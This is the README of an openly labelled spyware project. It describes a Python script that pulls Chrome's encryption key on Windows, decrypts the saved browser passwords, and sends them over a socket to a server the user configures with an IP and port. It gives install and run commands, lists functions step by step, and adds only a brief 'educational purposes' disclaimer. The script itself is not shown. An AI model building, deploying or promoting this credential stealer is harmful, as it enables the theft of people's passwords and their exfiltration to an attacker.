# Chrome Password Decryptor - SpyWare

This project contains a script designed to extract and decrypt saved passwords from Google Chrome on Windows operating systems. It retrieves the saved passwords from Chrome's database, decrypts them using the secret key, and sends the data to a specified server.

## Disclaimer

This script is intended for educational purposes only. Unauthorized use of this script may violate the terms of service of Google Chrome and other agreements. Use it responsibly and only on systems where you have explicit permission to access and extract this information.

## Requirements

- Python 3.x
- `pycryptodome` library
- `pypiwin32` library

You can install the required libraries using pip:

```sh
pip install pycryptodome pypiwin32
```
## How It Works
The script first checks if the operating system is Windows.
It retrieves the Chrome secret key from the Local State file.
It copies the Chrome login database.
It decrypts the saved passwords using the retrieved secret key.
It writes the decrypted information to a file and sends it to a specified server.
Usage
Clone this repository to your local machine.
Modify the script to set the server IP and port which is our receiver:

python
```
ip = 'your_server_ip'
port = your_server_port
```

```sh
python browserware.py
```
## Script Details
### Functions
get_secret_key(): Retrieves the Chrome secret key from the Local State file.
decrypt_payload(cipher, payload): Decrypts the payload using the provided cipher.
generate_cipher(aes_key, iv): Generates an AES cipher using the secret key and initialization vector (IV).
decrypt_password(ciphertext, secret_key): Decrypts the password using the cipher and secret key.
get_db_connection(chrome_path_login_db): Copies the Chrome login database and establishes a SQLite connection.

## Main Script
Checks if the operating system is Windows.
Establishes a socket connection to the specified server.
Retrieves the Chrome secret key.
Iterates through Chrome profiles to extract and decrypt saved passwords.
Writes the decrypted passwords to a file and sends the data to the server.

## Note
Ensure that you have the necessary permissions to run this script and that it is only used for legitimate purposes.

## License
This project is licensed under the MIT License.
